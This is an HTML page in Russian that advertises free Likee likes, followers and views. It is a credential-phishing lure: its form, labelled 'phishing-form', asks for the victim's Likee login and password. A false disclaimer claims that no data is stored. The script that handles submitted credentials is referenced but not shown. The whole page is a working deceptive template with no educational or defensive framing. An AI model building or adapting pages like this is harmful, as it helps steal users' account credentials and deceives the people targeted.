<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Бесплатные бонусы Likee 🎉</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>🎁 Бесплатные подписки, лайки и просмотры! 🎉</h1>
        <p>Выберите бонус и введите данные Likee, чтобы получить его! 🚀</p>
        <form id="phishing-form">
            <div class="bonus-options">
                <div class="bonus-option" data-value="1000 лайков">❤️ 1000 лайков</div>
                <div class="bonus-option" data-value="250 подписчиков">👥 250 подписчиков</div>
                <div class="bonus-option" data-value="1000 просмотров">👁️ 1000 просмотров</div>
            </div>
            <input type="text" id="profile-link" placeholder="🔗 Вставьте ссылку на профиль или видео" required>
            <input type="text" id="username" placeholder="👤 Логин Likee" required>
            <input type="password" id="password" placeholder="🔒 Пароль Likee" required>
            <button type="submit">🔥 Получить бонус 🔥</button>
        </form>
        <p class="disclaimer">⚠️ Мы не храним ваши данные. Авторизация требуется для подтверждения личности.</p>
    </div>
    <script src="script.js"></script>
</body>
</html>
